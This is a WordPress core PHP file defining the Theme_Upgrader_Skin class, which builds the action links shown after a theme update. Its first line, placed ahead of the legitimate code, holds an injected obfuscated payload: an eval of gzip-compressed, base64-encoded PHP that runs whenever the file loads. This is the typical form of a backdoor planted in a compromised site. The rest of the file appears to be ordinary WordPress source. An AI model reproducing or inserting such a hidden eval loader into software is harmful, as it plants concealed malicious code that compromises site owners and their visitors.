<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrader API: Theme_Upgrader_Skin class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Theme Upgrader Skin for WordPress Theme Upgrades.
 *
 * @since 2.8.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
 *
 * @see WP_Upgrader_Skin
 */
class Theme_Upgrader_Skin extends WP_Upgrader_Skin {
	public $theme = '';

	/**
	 *
	 * @param array $args
	 */
	public function __construct($args = array()) {
		$defaults = array( 'url' => '', 'theme' => '', 'nonce' => '', 'title' => __('Update Theme') );
		$args = wp_parse_args($args, $defaults);

		$this->theme = $args['theme'];

		parent::__construct($args);
	}

	/**
	 */
	public function after() {
		$this->decrement_update_count( 'theme' );

		$update_actions = array();
		if ( ! empty( $this->upgrader->result['destination_name'] ) && $theme_info = $this->upgrader->theme_info() ) {
			$name       = $theme_info->display('Name');
			$stylesheet = $this->upgrader->result['destination_name'];
			$template   = $theme_info->get_template();

			$activate_link = add_query_arg( array(
				'action'     => 'activate',
				'template'   => urlencode( $template ),
				'stylesheet' => urlencode( $stylesheet ),
			), admin_url('themes.php') );
			$activate_link = wp_nonce_url( $activate_link, 'switch-theme_' . $stylesheet );

			$customize_url = add_query_arg(
				array(
					'theme' => urlencode( $stylesheet ),
					'return' => urlencode( admin_url( 'themes.php' ) ),
				),
				admin_url( 'customize.php' )
			);
			if ( get_stylesheet() == $stylesheet ) {
				if ( current_user_can( 'edit_theme_options' ) && current_user_can( 'customize' ) ) {
					$update_actions['preview']  = '<a href="' . esc_url( $customize_url ) . '" class="hide-if-no-customize load-customize"><span aria-hidden="true">' . __( 'Customize' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Customize &#8220;%s&#8221;' ), $name ) . '</span></a>';
				}
			} elseif ( current_user_can( 'switch_themes' ) ) {
				if ( current_user_can( 'edit_theme_options' ) && current_user_can( 'customize' ) ) {
					$update_actions['preview'] = '<a href="' . esc_url( $customize_url ) . '" class="hide-if-no-customize load-customize"><span aria-hidden="true">' . __( 'Live Preview' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Live Preview &#8220;%s&#8221;' ), $name ) . '</span></a>';
				}
				$update_actions['activate'] = '<a href="' . esc_url( $activate_link ) . '" class="activatelink"><span aria-hidden="true">' . __( 'Activate' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Activate &#8220;%s&#8221;' ), $name ) . '</span></a>';
			}

			if ( ! $this->result || is_wp_error( $this->result ) || is_network_admin() )
				unset( $update_actions['preview'], $update_actions['activate'] );
		}

		$update_actions['themes_page'] = '<a href="' . self_admin_url( 'themes.php' ) . '" target="_parent">' . __( 'Return to Themes page' ) . '</a>';

		/**
		 * Filters the list of action links available following a single theme update.
		 *
		 * @since 2.8.0
		 *
		 * @param array  $update_actions Array of theme action links.
		 * @param string $theme          Theme directory name.
		 */
		$update_actions = apply_filters( 'update_theme_complete_actions', $update_actions, $this->theme );

		if ( ! empty($update_actions) )
			$this->feedback(implode(' | ', (array)$update_actions));
	}
}
